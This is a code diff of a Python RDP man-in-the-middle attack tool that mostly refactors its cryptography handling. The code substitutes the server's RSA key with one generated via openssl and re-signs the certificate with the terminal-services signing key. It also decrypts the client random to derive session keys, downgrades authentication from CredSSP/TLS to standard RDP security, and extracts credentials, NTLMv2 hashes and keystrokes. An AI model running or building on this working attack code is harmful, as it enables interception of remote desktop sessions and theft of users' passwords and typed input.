@@ -19,8 +19,8 @@ from hexdump import hexdump
 import select
 import struct
 import time
-import rsa
 import hashlib
+import subprocess
 
 
 parser = argparse.ArgumentParser(
@@ -205,21 +205,21 @@ def extract_server_cert(bytes):
                     dwKeyAlg,
                     pubkey_type,
                     pubkey_len )
-    global original_crypto
-    original_crypto = {"modulus": modulus,
-                     "pub_exponent": pub_exp,
-                     "data_len": data_len,
-                     "server_rand": server_random, # little endian
-                     "sign": sign,
-                     "first5fields": first5fields,
-                     "pubkey_blob": pubkey,
-                     "client_rand": b"",
-                    }
-    original_crypto["pubkey"] = rsa.PublicKey(
-        int.from_bytes(modulus, "little"),
-        pub_exp,
-    )
-    #  print(original_crypto)
+    global crypto
+    crypto = {"modulus": modulus,
+             "pub_exponent": pub_exp,
+             "data_len": data_len,
+             "server_rand": server_random, # little endian
+             "sign": sign,
+             "first5fields": first5fields,
+             "pubkey_blob": pubkey,
+             "client_rand": b"",
+    }
+    crypto["pubkey"] = {
+        "modulus": int.from_bytes(modulus, "little"),
+        "publicExponent": pub_exp,
+    }
+    #  print(crypto)
 
     return (b"Server cert modulus: " + hexlify(modulus) +
             b"\nSignature: " + hexlify(sign) +
@@ -227,17 +227,14 @@ def extract_server_cert(bytes):
 
 
 def extract_client_random(bytes):
-    #  with open("data/client_rand.bytes", 'rb') as f:
-        #  bytes = f.read()
-    global original_crypto
-    global my_keys
+    global crypto
     for i in range(7,len(bytes)-4):
         rand_len = bytes[i:i+4]
         if struct.unpack('<I', rand_len)[0] == len(bytes)-i-4:
             client_rand = bytes[i+4:]
-            original_crypto["enc_client_rand"] = client_rand
-            client_rand = rsa_decrypt(client_rand, my_keys["privkey"])
-            original_crypto["client_rand"] = client_rand
+            crypto["enc_client_rand"] = client_rand
+            client_rand = rsa_decrypt(client_rand, crypto["mykey"])
+            crypto["client_rand"] = client_rand
             generate_session_keys()
             return(b"Client random: " + hexlify(client_rand))
     return b""
@@ -248,25 +245,66 @@ def reencrypt_client_random(bytes):
     public key) with the client random encrypted with the original public
     key"""
 
-    reenc_client_rand = rsa_encrypt(original_crypto["client_rand"],
-                                    original_crypto["pubkey"]) + b"\x00"*8
-    result = bytes.replace(original_crypto["enc_client_rand"],
+    reenc_client_rand = rsa_encrypt(crypto["client_rand"],
+                                    crypto["pubkey"]) + b"\x00"*8
+    result = bytes.replace(crypto["enc_client_rand"],
                            reenc_client_rand)
+    return result
+
+
+def generate_rsa_key(keysize):
+    print(str(keysize))
+    p = subprocess.Popen(
+        ["openssl", "genrsa", str(keysize)],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL
+    )
+    key_pipe = subprocess.Popen(
+        ["openssl", "rsa", "-noout", "-text"],
+        stdin=p.stdout,
+        stdout=subprocess.PIPE
+    )
+    p.stdout.close()
+    output = key_pipe.communicate()[0]
+
+    key = None
+    result = {}
+    for line in output.split(b'\n'):
+        field = line.split(b':')[:2]
+        if len(field) == 2 and field[0] in [
+            b'modulus',
+            b'privateExponent',
+            b'publicExponent'
+        ]:
+            key = field[0].decode()
+            result[key] = field[1]
+        elif not line[:1] == b" ":
+            key = None
+        if line[:4] == b" "*4 and key in result:
+            result[key] += line[4:]
+
+    for f in ["modulus", "privateExponent"]:
+        b = result[f].replace(b':', b'')
+        b = unhexlify(b)
+        result[f] = int.from_bytes(b, "big")
+
+    m = re.match(b'.* ([0-9]+) ', result['publicExponent'])
+    result['publicExponent'] = int(m.groups(1)[0])
     return result
 
 
 def rsa_encrypt(bytes, key):
     r = int.from_bytes(bytes, "little")
-    e = key.e
-    n = key.n
+    e = key["publicExponent"]
+    n = key["modulus"]
     c = pow(r, e, n)
     return c.to_bytes(2048, "little").rstrip(b"\x00")
 
 
 def rsa_decrypt(bytes, key):
     s = int.from_bytes(bytes, "little")
-    d = key.d
-    n = key.n
+    d = key["privateExponent"]
+    n = key["modulus"]
     m = pow(s, d, n)
     return m.to_bytes(2048, "little").rstrip(b"\x00")
 
@@ -310,35 +348,35 @@ def decrypt(bytes, From="Client"):
 
 
 def sym_encryption_enabled():
-    global original_crypto
-    return ("original_crypto" in globals() and
-            not original_crypto["client_rand"] == b"")
+    global crypto
+    return ("crypto" in globals() and
+            not crypto["client_rand"] == b"")
 
 
 def generate_session_keys():
     # Ch. 5.3.5.1
     def salted_hash(s, i):
-        global original_crypto
+        global crypto
         sha1 = hashlib.sha1()
-        sha1.update(i + s + original_crypto["client_rand"] +
-                    original_crypto["server_rand"])
+        sha1.update(i + s + crypto["client_rand"] +
+                    crypto["server_rand"])
         md5 = hashlib.md5()
         md5.update(s + sha1.digest())
         return md5.digest()
 
     def final_hash(k):
-        global original_crypto
+        global crypto
         md5 = hashlib.md5()
-        md5.update(k + original_crypto["client_rand"] +
-                   original_crypto["server_rand"])
+        md5.update(k + crypto["client_rand"] +
+                   crypto["server_rand"])
         return md5.digest()
 
-    global original_crypto
+    global crypto
 
     # Non-Fips
 
-    pre_master_secret = (original_crypto["client_rand"][:24] +
-            original_crypto["server_rand"][:24])
+    pre_master_secret = (crypto["client_rand"][:24] +
+            crypto["server_rand"][:24])
     master_secret = (salted_hash(pre_master_secret, b"A") +
                      salted_hash(pre_master_secret, b"BB") +
                      salted_hash(pre_master_secret, b"CCC"))
@@ -353,11 +391,11 @@ def generate_session_keys():
     client_encrypt_key = server_decrypt_key
     client_decrypt_key = server_encrypt_key
 
-    original_crypto["mac_key"] = mac_key
-    original_crypto["server_encrypt_key"] = server_encrypt_key
-    original_crypto["server_decrypt_key"] = server_decrypt_key
-    original_crypto["client_encrypt_key"] = client_encrypt_key
-    original_crypto["client_decrypt_key"] = client_decrypt_key
+    crypto["mac_key"] = mac_key
+    crypto["server_encrypt_key"] = server_encrypt_key
+    crypto["server_decrypt_key"] = server_decrypt_key
+    crypto["client_encrypt_key"] = client_encrypt_key
+    crypto["client_decrypt_key"] = client_decrypt_key
 
     # TODO handle shorter keys than 128 bit
     print("Session keys generated")
@@ -368,10 +406,9 @@ def init_rc4_sbox():
     print("Initializing RC4 s-box")
     global RC4_CLIENT
     global RC4_SERVER
-    global original_crypto
-    RC4_CLIENT = RC4(original_crypto["server_decrypt_key"])
-    RC4_SERVER = RC4(original_crypto["client_decrypt_key"])
-
+    global crypto
+    RC4_CLIENT = RC4(crypto["server_decrypt_key"])
+    RC4_SERVER = RC4(crypto["client_decrypt_key"])
 
 
 def rc4_decrypt(data, From="Client"):
@@ -440,7 +477,7 @@ def extract_key_press(bytes):
         if event %2 == 0 and key:
             result += b"Key press:   %s\n" % key.encode()
         elif event % 2 == 1 and key:
-            result += b"Key release: %s\n" % key.encode()
+            result += b"Key release:                 %s\n" % key.encode()
         if event > 1 and key:
             result += extract_key_press(
                 b"\x44%c%s" % (len(bytes)-2, bytes[2:-2])
@@ -449,21 +486,20 @@ def extract_key_press(bytes):
 
 
 def replace_server_cert(bytes):
-    global original_crypto
-    global my_keys
-    old_sig = sign_certificate(original_crypto["first5fields"] +
-                               original_crypto["pubkey_blob"])
-    assert old_sig == original_crypto["sign"]
-    key_len = len(original_crypto["modulus"])-8
-    (pubkey, privkey) = rsa.newkeys(key_len*8)
-    my_keys = {"pubkey": pubkey, "privkey": privkey}
-    new_modulus = pubkey.n.to_bytes(key_len + 8, "little")
-    old_modulus = original_crypto["modulus"]
+    global crypto
+    old_sig = sign_certificate(crypto["first5fields"] +
+                               crypto["pubkey_blob"])
+    assert old_sig == crypto["sign"]
+    key_len = len(crypto["modulus"])-8
+    crypto["mykey"] = generate_rsa_key(key_len*8)
+    new_modulus = crypto["mykey"]["modulus"].to_bytes(key_len + 8, "little")
+    print(key_len,len(new_modulus), new_modulus)
+    old_modulus = crypto["modulus"]
     result = bytes.replace(old_modulus, new_modulus)
-    new_pubkey_blob = original_crypto["pubkey_blob"].replace(old_modulus,
+    new_pubkey_blob = crypto["pubkey_blob"].replace(old_modulus,
                                                              new_modulus)
-    new_sig = sign_certificate(original_crypto["first5fields"] + new_pubkey_blob)
-    result = result.replace(original_crypto["sign"], new_sig)
+    new_sig = sign_certificate(crypto["first5fields"] + new_pubkey_blob)
+    result = result.replace(crypto["sign"], new_sig)
 
     return result
 
@@ -477,7 +513,7 @@ def sign_certificate(bytes):
     d = int.from_bytes(TERM_SIGN_PRIV_KEY["d"], "little")
     n = int.from_bytes(TERM_SIGN_PRIV_KEY["n"], "little")
     s = pow(m, d, n)
-    return s.to_bytes(len(original_crypto["sign"]), "little")
+    return s.to_bytes(len(crypto["sign"]), "little")
 
 
 def parse_rdp(bytes, From="Client"):
@@ -507,8 +543,8 @@ def parse_rdp_packet(bytes, From="Client"):
     # lines
 
     # "0x0040 MUST be present"
-    cred_regex = b".{30}40.{20}(.{4})(.{4})(.{4})"
-    m = re.match(cred_regex, hexlify(bytes))
+    regex = b".{30}40.{20}(.{4})(.{4})(.{4})"
+    m = re.match(regex, hexlify(bytes))
     if m:
         try:
             result = extract_credentials(bytes, m)
@@ -516,25 +552,25 @@ def parse_rdp_packet(bytes, From="Client"):
             result = b""
         #  close();exit(0)
 
-    cred_regex = b".*%s0002000000" % hexlify(b"NTLMSSP")
-    m = re.match(cred_regex, hexlify(bytes))
+    regex = b".*%s0002000000" % hexlify(b"NTLMSSP")
+    m = re.match(regex, hexlify(bytes))
     if m:
         result = extract_server_challenge(bytes, m)
 
-    cred_regex = b".*%s0003000000" % hexlify(b"NTLMSSP")
-    m = re.match(cred_regex, hexlify(bytes))
+    regex = b".*%s0003000000" % hexlify(b"NTLMSSP")
+    m = re.match(regex, hexlify(bytes))
     if m:
         result = extract_ntlmv2(bytes, m)
 
-    global original_crypto
-    if "original_crypto" in globals():
+    global crypto
+    if "crypto" in globals():
         regex = b".{14,}01.*0{16}"
         m = re.match(regex, hexlify(bytes))
-        if m and original_crypto["client_rand"] == b"":
+        if m and crypto["client_rand"] == b"":
             result = extract_client_random(bytes)
 
-    cred_regex = b".*020c.*%s" % hexlify(b"RSA1")
-    m = re.match(cred_regex, hexlify(bytes))
+    regex = b".*020c.*%s" % hexlify(b"RSA1")
+    m = re.match(regex, hexlify(bytes))
     if m:
         result = extract_server_cert(bytes)
 
@@ -547,11 +583,6 @@ def parse_rdp_packet(bytes, From="Client"):
     if len(bytes)>3 and bytes[-2] in [0,1,2,3] and result == b"":
         result = extract_key_press(bytes)
 
-    #  keymap_regex = b".*en-us.*" # TODO find keymap definition
-    #  (CLIENT_CORE_DATA)
-    #  m = re.match(keymap_regex, bytes)
-    #  if m:
-    #      result = b"Keymap: " + bytes
 
     if not result == b"" and not result == None:
         print("\033[31m%s\033[0m" % result.decode())
@@ -560,11 +591,11 @@ def parse_rdp_packet(bytes, From="Client"):
 def tamper_data(bytes):
     result = bytes
 
-    global original_crypto
-    if "original_crypto" in globals():
+    global crypto
+    if "crypto" in globals():
         regex = b".{14,}01.*0{16}"
         m = re.match(regex, hexlify(bytes))
-        if m and not original_crypto["client_rand"] == b"":
+        if m and not crypto["client_rand"] == b"":
             result = reencrypt_client_random(bytes)
 
     regex = b".*020c.*%s" % hexlify(b"RSA1")
@@ -598,20 +629,20 @@ def set_fake_requested_protocol(data, m):
 
 
 def downgrade_auth(bytes):
-    # TODO put in tamper_data
-    cred_regex = b".*..00..00.{8}$"
-    m = re.match(cred_regex, hexlify(bytes))
+    regex = b".*..00..00.{8}$"
+    m = re.match(regex, hexlify(bytes))
     global RDP_PROTOCOL
     global RDP_PROTOCOL_OLD
     RDP_PROTOCOL = RDP_PROTOCOL_OLD = bytes[-4]
     # Flags:
     # 0: standard rdp security
-    # 1: TLS ontop of that
+    # 1: TLS instead
     # 2: CredSSP (NTLMv2 or Kerberos)
     # 8: CredSSP + Early User Authorization
     if m and RDP_PROTOCOL >= args.downgrade:
+        print("Downgrading authentication options from %d to %d..." %
+              (RDP_PROTOCOL, args.downgrade))
         RDP_PROTOCOL = args.downgrade
-        print("Downgrading authentication options...")
         result = (
             bytes[:-7] +
             b"\x00\x08\x00" +
@@ -694,25 +725,12 @@ def forward_data():
     return True
 
 
-def original_dest(s):
-    SO_ORIGINAL_DEST = 80
-    sockaddr_in = s.getsockopt(socket.SOL_IP, SO_ORIGINAL_DEST, 16)
-    (proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
-    return "%d.%d.%d.%d:%d" % (a, b, c, d, port)
-
-
 def open_sockets():
     global local_conn
     global remote_socket
     print("Waiting for connection")
     local_conn, addr = local_socket.accept()
     print("Connection received from " + addr[0])
-
-    #  try:
-    #  print("Original destination: " + original_dest(local_conn))
-    #  except OSError:
-        #  print
-        #  pass
 
     remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     remote_socket.connect((args.target_host, args.target_port))
@@ -741,8 +759,6 @@ try:
         run()
 except KeyboardInterrupt:
     pass
-#  except Exception as e:
-#      print(str(e))
 finally:
     local_socket.close()
     close()
